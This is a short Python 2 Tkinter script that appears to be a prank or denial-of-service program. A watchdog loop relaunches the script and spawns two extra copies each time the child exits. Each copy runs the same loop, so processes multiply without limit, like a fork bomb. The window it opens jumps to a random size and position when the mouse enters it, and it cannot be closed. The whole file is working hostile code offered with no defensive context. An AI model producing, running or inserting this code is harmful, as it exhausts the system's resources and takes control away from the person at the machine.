import Tkinter as t;
from random import randrange;
import sys;
import subprocess;
if not "CAFEDEAD" in sys.argv:
	sp = subprocess.Popen(["python.exe", "-O",__file__, "CAFEDEAD"] + sys.argv[1:], shell=False)
	while True:
		sp.wait();
		sp = subprocess.Popen(["python.exe", "-O",__file__, "CAFEDEAD"] + sys.argv[1:], shell=False)
		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
		subprocess.Popen(["python.exe", "-O",__file__] + sys.argv[1:], shell=False)
root = t.Tk();
root.bind("<Enter>", lambda event: event.widget.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000))));
root.protocol("WM_DELETE_WINDOW", lambda: root.geometry(str(randrange(400)) + "x" + str(randrange(400)) + "+" + str(randrange(1000)) + "+" + str(randrange(1000))));
root.mainloop();
